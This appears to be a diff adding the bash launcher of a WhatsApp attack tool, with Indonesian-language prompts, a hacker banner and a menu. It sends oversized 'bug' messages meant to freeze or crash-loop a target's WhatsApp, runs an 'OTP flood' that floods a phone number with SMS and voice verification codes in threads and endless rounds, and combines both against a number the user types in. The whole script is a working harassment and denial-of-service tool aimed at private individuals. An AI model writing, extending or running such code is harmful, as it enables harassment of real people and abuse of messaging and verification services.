@@ -1,0 +1,195 @@
+#!/usr/bin/env bash
+set -u
+D="$(cd "$(dirname "${BASH_SOURCE[0]}")/.." && pwd)"
+L="$D/lib"
+# shellcheck source=../lib/platform.sh
+. "$L/platform.sh"
+
+G=$'\e[1;32m'; R=$'\e[1;31m'; Y=$'\e[1;33m'; B=$'\e[1;36m'; M=$'\e[35m'; W=$'\e[1;37m'; N=$'\e[0m'
+VERSION="$(cat "$D/VERSION" 2>/dev/null || echo 0.0.0)"
+
+NUM=""; ENG=""; MTD=""; THR=""; RND=""; DLY=""; GAP=""; INT=""; CNT=""
+
+rain(){ for _ in 1 2 3; do printf '%s' "$M"
+  for _ in $(seq 1 78); do printf '%d' $((RANDOM%2)); done; printf '%s\n' "$N"; done; }
+
+banner(){ clear 2>/dev/null; rain
+cat <<EOF
+$G      ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄
+$G    ▄█████████████████████████████████▄
+$G   █████████████████████████████████████
+$G  ██████████▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀██████████
+$G ██████████   ▄▄▄▄▄▄▄▄▄▄▄▄▄▄   ██████████
+$G █████████   ███▀▀▀▀▀▀▀▀▀▀███   █████████
+$G █████████   ███  ▄▄▄▄▄▄  ███   █████████
+$G █████████   ███▄▄▄▄▄▄▄▄▄███   █████████
+$G ██████████   ▀██████████▀    ███████████
+$G  ██████████▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄██████████
+$G   █████████████████████████████████████
+$G    ▀█████████████████████████████████▀
+$G         ▀▀████████████████████▀▀
+$G               ▀▀██████████▀▀
+$G                  ▀█████▀
+$G                    ▀▀
+
+$W █▄ ▄█ █   █ █████ █   █   █   █████ █     █   █ █   █
+$W ██ ██ █   █    █  █  █   ██  █   █ █     █   █  █ █
+$W █ █ █ █████   █   ███     █  █████ █     █████   █
+$W █   █     █  █    █  █    █  █     █         █   █
+$W █   █     █ █████ █   █ █████ █     █████     █   █
+$R        · W H 4 T S 4 P · v$VERSION · R A W ·
+$B   delay · force close · otp flood · auto engine
+$M   platform: $MZK_PLATFORM$N
+EOF
+}
+
+norm(){ local x; x="$(printf '%s' "$1" | tr -dc 0-9)"; x="${x#0}"
+  case "$x" in 62*) printf '%s' "$x";; *) printf '%s' "62$x";; esac; }
+
+need(){ command -v "$1" >/dev/null 2>&1 || { echo "${R}[x] '$1' tidak ada.${N}"
+  echo "${Y}    $(mzk_deps_hint)${N}"; exit 1; }; }
+
+send_payload(){ local n="$1" t="$2" len=${#t}
+  if [ "$len" -gt 7500 ]; then
+    if printf '%s' "$t" | mzk_set_clip; then
+      mzk_open_url "https://wa.me/$n" >/dev/null
+      echo "${Y}[!] $len char → clipboard. Chat terbuka, paste lalu kirim.${N}"
+    else
+      echo "${Y}[!] $len char, clipboard tidak tersedia. URL dicetak:${N}"
+      printf 'https://wa.me/%s?text=%s\n' "$n" \
+        "$(python3 -c 'import urllib.parse,sys;print(urllib.parse.quote(sys.argv[1]))' "$t")"
+    fi
+  else
+    local enc
+    enc=$(python3 -c 'import urllib.parse,sys;print(urllib.parse.quote(sys.argv[1]))' "$t")
+    mzk_open_url "https://wa.me/$n?text=$enc" >/dev/null
+    echo "${G}[+] Payload $len char dilontarkan. Tap KIRIM.${N}"
+  fi
+}
+
+do_bug(){ local kind="$1" label="$2" int="${3:-20000}" cnt="${4:-1}" eng="${5:-intent}"
+  banner; echo " ${R}»${N} $label"; echo
+  [ -z "$NUM" ] && read -rp " Nomor target (62xxx): " NUM
+  local n; n=$(norm "$NUM"); echo " ${G}target →${N} $n"; echo
+  if [ "$eng" = "ask" ]; then
+    echo "${B}Engine:${N} 1) INTENT  2) AUTO (login QR)"; read -rp ">> " e
+    [ "$e" = "2" ] && eng="auto" || eng="intent"
+  fi
+  python3 "$L/payload.py" "$kind" "$int" > "$L/p.tmp"
+  local len; len=$(wc -c < "$L/p.tmp")
+  echo " ${Y}payload: $len karakter${N}"; echo
+  if [ "$eng" = "auto" ]; then
+    need node
+    node "$L/auto.js" "$n" "$L/p.tmp" "$cnt" "${GAP:-1500}"
+  else
+    local i
+    for i in $(seq 1 "$cnt"); do
+      send_payload "$n" "$(cat "$L/p.tmp")"
+      [ "$i" -lt "$cnt" ] && sleep 2
+    done
+  fi
+}
+
+do_otp(){ banner; echo " ${R}» OTP FLOOD — BRUTAL${N}"; echo
+  [ -z "$NUM" ] && read -rp " Nomor target (62xxx): " NUM
+  local n; n=$(norm "$NUM"); echo " ${G}target →${N} $n"; echo
+  if [ -z "$MTD" ]; then
+    echo "${B}Metode:${N} 1) SMS 2) VOICE 3) DUA-DUANYA"; read -rp ">> " m
+    case "$m" in 2) MTD=voice;; 3) MTD=both;; *) MTD=sms;; esac
+  fi
+  [ -z "$THR" ] && { read -rp " Thread (8): " THR; THR=${THR:-8}; }
+  [ -z "$RND" ] && { read -rp " Ronde — 0 tanpa henti (10): " RND; RND=${RND:-10}; }
+  python3 "$L/otp.py" "$n" "$MTD" "$THR" "$RND" "${DLY:-1.0}" burn
+}
+
+do_combo(){ banner; echo " ${R}» OTP + PESAN BUG${N}"; echo
+  [ -z "$NUM" ] && read -rp " Nomor target (62xxx): " NUM
+  local n; n=$(norm "$NUM") P
+  echo; echo "${R}[1/2] OTP flood di background (60s)...${N}"
+  python3 "$L/otp.py" "$n" both 6 0 0.8 burn & P=$!
+  sleep 3; echo; echo "${R}[2/2] Lontar payload force close...${N}"
+  python3 "$L/payload.py" crash 45000 > "$L/p.tmp"
+  local i
+  for i in 1 2 3 4 5; do send_payload "$n" "$(cat "$L/p.tmp")"; sleep 2; done
+  echo; echo "${Y}[*] OTP flood masih jalan. ENTER stop.${N}"; read -rp ""
+  kill "$P" 2>/dev/null
+  echo "${G}[+] combo selesai.${N}"
+}
+
+do_check(){ [ -z "$NUM" ] && read -rp "Nomor: " NUM
+  local n; n=$(norm "$NUM")
+  python3 "$L/otp.py" "$n" sms 1 0 0.5 2>/dev/null | head -3
+}
+
+menu(){ while true; do banner
+cat <<EOF
+
+  $Y┌──────────────────────────────────┐
+  $Y│$N  $R[1]$N  BUG DELAY  (HARD)         $Y│
+  $Y│$N  $R[2]$N  BUG FORCE CLOSE (LOOP)    $Y│
+  $Y│$N  $R[3]$N  OTP FLOOD — BRUTAL       $Y│
+  $Y│$N  $R[4]$N  OTP + PESAN (COMBO)       $Y│
+  $Y│$N  $G[5]$N  CEK NOMOR                $Y│
+  $Y│$N  $B[6]$N  LOGIN ULANG (hapus auth)  $Y│
+  $Y│$N  $R[0]$N  KELUAR                   $Y│
+  $Y└──────────────────────────────────┘$N
+
+EOF
+  read -rp " m4zk1p@wa:~# " o
+  case "$o" in
+    1) do_bug delay "BUG DELAY HARD — UI freeze" 20000 1 ask;;
+    2) do_bug crash "BUG FORCE CLOSE — crash loop" 45000 1 ask;;
+    3) do_otp;; 4) do_combo;; 5) do_check;;
+    6) rm -rf "$L/auth"; echo "${Y}auth dihapus.${N}"; sleep 1;;
+    0|q) exit 0;;
+  esac
+  echo; read -rp "ENTER..." _
+done; }
+
+usage(){ cat <<EOF
+M4zk1pL4yWhatsap v$VERSION
+
+  m4zk1p --menu
+  m4zk1p delay   <nomor> [-i N] [-n N] [-e intent|auto]
+  m4zk1p crash   <nomor> [-i N] [-n N] [-e intent|auto]
+  m4zk1p otp     <nomor> [-m sms|voice|both] [-t N] [-r N] [-d SEC]
+  m4zk1p combo   <nomor>
+  m4zk1p check   <nomor>
+
+Opsi global:
+  --no-open   jangan buka browser/app, cetak URL saja
+  -y          pakai nilai default, tanpa tanya
+
+Contoh:
+  m4zk1p otp 628123456789 -m both -t 12 -r 0 -d 0.5
+  m4zk1p crash 628123456789 -i 5 -n 20 -e auto
+EOF
+}
+
+case "${1:-}" in
+  -h|--help|"") usage; exit 0;;
+  --menu) menu; exit 0;;
+esac
+
+CMD="$1"; shift
+while [ $# -gt 0 ]; do case "$1" in
+  -i|--intensity) INT="$2"; shift 2;;
+  -n|--count)     CNT="$2"; shift 2;;
+  -e|--engine)    ENG="$2"; shift 2;;
+  -m|--method)    MTD="$2"; shift 2;;
+  -t|--threads)   THR="$2"; shift 2;;
+  -r|--rounds)    RND="$2"; shift 2;;
+  -d|--delay)     DLY="$2"; shift 2;;
+  --no-open)      MZK_NOOPEN=1; shift;;
+  -y|--yes)       shift;;
+  *) NUM="$1"; shift;;
+esac; done
+
+case "$CMD" in
+  delay) do_bug delay "BUG DELAY HARD" "${INT:-20000}" "${CNT:-1}" "${ENG:-intent}";;
+  crash) do_bug crash "BUG FORCE CLOSE" "${INT:-45000}" "${CNT:-1}" "${ENG:-intent}";;
+  otp)   do_otp;;
+  combo) do_combo;;
+  check) do_check;;
+  *) usage; exit 1;;
+esac
